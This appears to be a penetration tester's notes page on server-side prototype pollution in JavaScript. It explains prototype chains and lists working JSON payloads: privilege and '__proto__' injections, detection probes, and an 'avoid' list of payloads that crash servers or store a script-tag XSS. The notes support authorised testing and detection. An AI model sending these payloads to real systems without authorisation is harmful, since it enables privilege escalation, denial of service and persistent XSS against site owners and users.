Prototype Pollution

  • PayloadAllTheThings
  • PortSwigger
  • Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes

In JavaScript, a prototype is a blueprint for objects. When you create an object using a constructor function or a class, JavaScript will set up a link between the object and its prototype. Prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all instances of that object.

Objects inherits properties and methods from their prototype. A prototype chain is the links between the objects and their prototypes. When accessing a method or property, JavaScript goes up the chain until it finds it or (null). Object.prototype. is the top of the chain, polluting it affects all objects that inherit from it.

This example is from Gareth.

let obj = {a:1, b:2};

Object.prototype.c=3;

console.log(obj.c); // 3
  • obj.__proto__ === Object.prototype
  • obj.hasOwnProperty('__proto__'); -> false
    • the __proto__ property is inherited.

This is a normal POST json:

{
	username: "elliot",
	age: "25",
}

We could try to pollute it:

{
	username: "elliot",
	age: "25",
	isAdmin:true
}
  • If the user have the property, this would try to change it. If you can't change it, try to insert a random property and see if it reflects back.

This would be a prototype pollution:

{
	username: "elliot",
	age: "25",
	"__proto__": {
		"testValue": "pwnd"
	}
}

Safe Detection Methods​

  • Based on Gareth Heyes talk.
  • Again, I can't stress this enough, watch the Gareth talk. If you screw up with prototype pollution, you can break something.
// test it against an endpoint that takes multiple parameters.
{"__proto__":{"parameterLimit":1}}

//??foo=bar
{"__proto__":{"ignoreQueryPrefix":true}}

//?foo.bar=baz
{"__proto__":{"allowDots":true}}

//{"foo":"+AGIAYQBy-"}
{"__proto__":{"content-type":"application/json; charset=utf-7"}}

//add spaces in json
{"__proto__":{"json spaces":" "}}

//Access-Control-Expose-Headers
{"__proto__":{"exposedHeaders":["foo"]}}

//modify status code
{"__proto__":{"status":510}}

// OPTIONS
{"__proto__":{"head":true}}

Reflected properties inside JSON:

  • If you get any of these in the response you either god prototype pollution or object persistence.
{"__proto__":"random"}

{"__proto__x":"random"}

AVOID​

  • DON'T
  • Probably will break something
// this breaks
{"__proto__":{"encoding": "x"}}

// this breaks
{"__proto__":{"expect": 1337}}

// this breaks
{"constructor":{"keys": "x"}}

// this breaks
{"__proto__": {"toString": "Just crash the server"}}

// this stores XSS inside the application
{"__proto__": {"_body":true,"body":"<script>evil()"}}
